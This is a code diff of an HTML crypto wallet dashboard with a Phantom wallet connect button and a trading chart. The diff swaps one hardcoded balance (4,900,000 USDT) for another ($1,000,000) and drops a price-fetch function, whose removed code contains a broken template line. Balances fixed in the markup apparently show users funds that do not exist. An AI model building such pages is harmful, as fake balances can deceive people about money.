@@ -92,10 +92,9 @@
     }
 
     .balance {
-      font-size: 18px;
+      font-size: 22px;
       color: #39ff14;
       margin-top: 10px;
-      line-height: 1.8;
     }
 
     .wallet-info {
@@ -109,12 +108,6 @@
       width: 100%;
       height: 400px;
       margin-top: 20px;
-    }
-
-    .crypto-icon {
-      width: 16px;
-      vertical-align: middle;
-      margin-right: 5px;
     }
   </style>
 </head>
@@ -141,17 +134,11 @@
 <div class="container hidden" id="dashboard">
   <h2>Wallet Dashboard</h2>
   <div class="wallet-info" id="walletAddress">Not connected</div>
-  <div class="balance">
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon" />
-    Balance: 4,900,000.00 USDT<br>
-    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon" />
-    ≈ <span id="btcAmount">Loading...</span> BTC
-  </div>
+  <div class="balance">Balance: $1,000,000.00</div>
   <button class="login-button" onclick="connectWallet()">Connect Wallet</button>
   <button class="logout-btn" onclick="logout()">Logout</button>
 
-
-<iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
+  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
 
 <div class="footer hidden" id="footerNav">
@@ -226,7 +213,6 @@
     document.getElementById('registerForm').classList.add('hidden');
     document.getElementById('dashboard').classList.remove('hidden');
     document.getElementById('footerNav').classList.remove('hidden');
-    fetchBTCPrice();
   }
 
   function logout() {
@@ -253,19 +239,6 @@
       }
     } else {
       alert("Phantom Wallet not installed.");
-    }
-  }
-
-  async function fetchBTCPrice() {
-    try {
-      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd");
-      const data = await res.json();
-      const btcPrice = data.bitcoin.usd;
-      const usdtAmount = 4900000;
-      const btcAmount = (usdtAmount / btcPrice).toFixed(6);
-      document.getElementById("btcAmount").innerText = ${btcAmount};
-    } catch (e) {
-      document.getElementById("btcAmount").innerText = "Error loading";
     }
   }
 </script>
